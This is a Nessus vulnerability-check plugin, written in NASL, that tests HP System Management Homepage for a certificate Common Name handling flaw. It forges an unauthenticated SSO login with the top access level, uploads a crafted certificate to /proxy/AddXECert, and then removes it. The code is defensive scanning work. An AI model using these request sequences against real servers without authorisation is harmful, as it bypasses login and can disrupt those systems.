#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(90624);
  script_version("$Revision: 1.1 $");
  script_cvs_date("$Date: 2016/04/21 15:42:01 $");

  script_xref(name:"HP", value:"HPSBMU03546");
  script_xref(name:"HP", value:"emr_na-c05045763");

  script_name(english:"HP System Management Homepage (SMH) AddXECert Remote DoS");
  script_summary(english:"Checks for the presence of the vulnerability.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a denial of service
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The HP System Management Homepage (SMH) application running on the
remote web server is affected by a denial of service vulnerability due 
to improper handling of the Common Name in a certificate uploaded via
/proxy/AddXECert. An unauthenticated, remote attacker can exploit
this, via a crafted certificate, to cause a denial of service
condition.

For the exploit to work, the 'Trust Mode' setting must be configured
with 'Trust All', the 'IP Restricted login' setting must allow the
attacker to access SMH, and the 'Kerberos Authorization' (Windows
only) setting must be disabled.

Note that this plugin attempts to upload a certificate to the remote
SMH server, and the certificate is stored in
<SMH_INSTALLATION_DIR>/certs/. Nessus will attempt to delete the
certificate later. The user is advised to delete the certificate if
Nessus fails to do so. The uploaded certificate should appear under
Settings->SMH->Security->Trusted Management Servers in the SMH web
GUI, which the user can use to delete the certificate.

Additionally, note that the SMH running on the remote host is
reportedly affected by other vulnerabilities as well; however, Nessus
has not tested for these.");
  # http://h20564.www2.hpe.com/hpsc/doc/public/display?docId=emr_na-c05045763
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?4248fa41");
  script_set_attribute(attribute:"solution", value:
"Upgrade to HP System Management Homepage (SMH) version 7.5.4 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:H/Au:N/C:N/I:N/A:P");

  script_set_attribute(attribute:"vuln_publication_date", value:"2016/03/15");
  script_set_attribute(attribute:"patch_publication_date", value:"2016/03/15");
  script_set_attribute(attribute:"plugin_publication_date", value:"2016/04/21");

  script_set_attribute(attribute:"cpe", value:"cpe:/a:hp:system_management_homepage");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"Web Servers");

  script_copyright(english:"This script is Copyright (C) 2016 Tenable Network Security, Inc.");

  script_dependencies("compaq_wbem_detect.nasl", "os_fingerprint.nasl");
  script_require_keys("www/hp_smh", "www/compaq");
  script_require_ports("Services/www", 2301, 2381);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");

# The HP advisory says HPSMH on Windows and Linux are affected.
os = get_kb_item_or_exit("Host/OS");
os = tolower(os);
if ("windows" >!< os && "linux" >!< os) audit(AUDIT_OS_NOT, "Windows or Linux", os);

# Plugin will exit if SMH is not detected on the host
appname = 'hp_smh';
get_install_count(app_name:appname, exit_if_zero:TRUE);

port = get_http_port(default:2381, embedded:TRUE);

# Get SMH info from KB
# Plugin will exit if SMH is not detected on this port 
install = get_install_from_kb(appname:appname, port:port, exit_on_fail:TRUE);
prod  = get_kb_item_or_exit("www/"+port+"/hp_smh/variant");

# Attack vector is through https, so skip non-SSL ports
if (get_port_transport(port) == ENCAPS_IP)
  exit(0, "Service listening on port " + port + " does not speak SSL.");

# Use session cookie in subsequent requests
init_cookiejar();

tkn = crap(data:'TKN', length:16); # ?
key = string(unixtime() - 150);    # ?
ha  = 'hash_algorithm'; # not used; for documentation only 
xe  = 'XECert'; # servename checked by TrustedByName';
un  = 'nessus'; # user name 
ua  = '4';      # user access level, 4 = highest
# URL to redirect to after a successful 'login'
redirect = 'https://' + get_host_ip() + ':' + port + '/';
url = '/proxy/sso?' +
      'TKN=' + tkn +
      '&' + 'KEY=' + key +
      '&' + 'XE=' + xe +
      '&' + 'UN=' + un +
      '&' + 'UA=' + ua +
      '&' + 'URL=' + redirect;
res = http_send_recv3(port:port, item: url, method: 'GET', exit_on_fail:TRUE);

if (res[0] =~ '403')
{
  exit(0, 'The ' + prod + ' listening on port ' + port + ' is configured with IP restricted logins and Nessus is not allowed to access it.');
}

# Nessus can upload a certificate only if TrustedByAll is configured.
# With TrustedByAll, Nessus can 'login' to SMH without credentials.
# When the 'login' succeeds, the url specified in the URL param in the
# query string is put into the Location header in the response along
# with a 302 response status code. 
if(res[0] !~ '302' || !egrep(string:res[1],pattern:'Location: ' + redirect))
  exit(0, 'The '+ prod +' listening on port ' + port + ' is not configured with the TrustedByAll trust mode. Nessus cannot continue.'); 

req1 = http_last_sent_request();

#
# Certificate generated with:
# openssl req -x509 -nodes -days 7300 -newkey rsa:1024 -keyout key.pem -out cert.pem
#
# When prompted for common name (cn), used 'nessus-yc8gz2rd&aaa' (without quotes)
#
# Vulnerable SMH uses cn up to (but not including) the '&' character.
# Patched SMH uses the entire cn. 
vuln      = 'nessus-yc8gz2rd' + '.pem';
patched   = 'nessus-yc8gz2rd&aaa' + '.pem';

data = '
-----BEGIN CERTIFICATE-----
MIICjjCCAfegAwIBAgIJAIiEXVCI+2NaMA0GCSqGSIb3DQEBBQUAMGAxCzAJBgNV
BAYTAlhYMRUwEwYDVQQHDAxEZWZhdWx0IENpdHkxHDAaBgNVBAoME0RlZmF1bHQg
Q29tcGFueSBMdGQxHDAaBgNVBAMME25lc3N1cy15YzhnejJyZCZhYWEwHhcNMTYw
NDA1MjA1MzIxWhcNMzYwMzMxMjA1MzIxWjBgMQswCQYDVQQGEwJYWDEVMBMGA1UE
BwwMRGVmYXVsdCBDaXR5MRwwGgYDVQQKDBNEZWZhdWx0IENvbXBhbnkgTHRkMRww
GgYDVQQDDBNuZXNzdXMteWM4Z3oycmQmYWFhMIGfMA0GCSqGSIb3DQEBAQUAA4GN
ADCBiQKBgQCzzlCNj7OmjD94z/HlJbXgfL9H+Sf7KsliYnKrEFzZdr72OtEGlFAA
6poqeGBv0UVZialQh46Y7+e6+/OEbbQ7903NCbPa2ARt4Bo05yikq6f+fyN/vC6R
yZxssc5cFQLkGWzlaZ7iV2fjIthp6Gg5jVhj/NNKZFOiOD2TNtfL+QIDAQABo1Aw
TjAdBgNVHQ4EFgQUJvLSkBfO68F4PaqMnKg8R/KDTUswHwYDVR0jBBgwFoAUJvLS
kBfO68F4PaqMnKg8R/KDTUswDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQUFAAOB
gQCBXWx1DFmv0fpJdocmB/eKJChmaIWZVOTjAgs8RIghqWqBlEe/+rt5m0K5KwAR
t3h28tMcXACzDVSGgs66DZAhEfzdCnhQ6vylXJGtBmDa8JlprU37PO11KxVhbhXf
GpT3rmhFW3bH5IbHNm+6n2ABLAvwpPKz0DTsTq/xZ/6luQ==
-----END CERTIFICATE-----
';

data = urlencode(str:data);
data = 'AddXECert=' + data;
res = http_send_recv3(
        port        : port, 
        item        : '/proxy/AddXECert',
        method      : 'POST',
        data        : data, 
        content_type: 'application/x-www-form-urlencoded',
        exit_on_fail:TRUE);

# AddXECert will fail if Kerberos authorization is configured.
if(res[0] =~ '302' && egrep(string:res[1],pattern:'Location: /proxy/Kerberos'))
  exit(0, 'The '+ prod +' listening on port ' + port + ' is configured with Kerberos authorization. Nessus cannot continue.'); 

# If AddXECert succeeds, SMH will redirect us to /message.php?205&2 :
#   "Success: Certificate successfully imported."
if(res[0] !~ '302' || !egrep(string:res[1],pattern:'Location: /message.php\\?205&2'))
  exit(0, 'Failed to upload a certificate to the '+ prod +' listening on port ' + port + '. Nessus cannot continue.'); 

req2 = http_last_sent_request();

# Try to retrieve the list of installed certificates.
# If the 'AddXECert' request above succeeded, the cert we uploaded
# should be in the list.  
res = http_send_recv3(
        port        : port, 
        item        : '/Proxy/GetInstalledSsoCerts', 
        method      : 'GET',
        exit_on_fail:TRUE);

if( res[0] !~ '200' || ! res[2])
  audit(AUDIT_RESP_BAD, port, 'a GetInstalledSsoCerts request');

if(res[2] =~ vuln)
{
  vulnerable = TRUE;
  cert = vuln;
}
else if(res[2] =~ patched)
{
  vulnerable = FALSE;
  cert = patched;
}
else
  audit(AUDIT_RESP_BAD, port, 'a GetInstalledSsoCerts request: \n' + res[2]);

#  
# Attempt to delete the cert uploaded by this plugin 
#
res = http_send_recv3(
        port        : port, 
        item        : '/proxy/smhui/removecert?' + cert, 
        method      : 'GET');

# Report
if(vulnerable)
{
  security_report_v4(
    port       : port,
    severity   : SECURITY_NOTE,
    request    : make_list(req1, req2),
    generic    : TRUE
  );
}
else
{
  audit(AUDIT_LISTEN_NOT_VULN, prod, port);
}
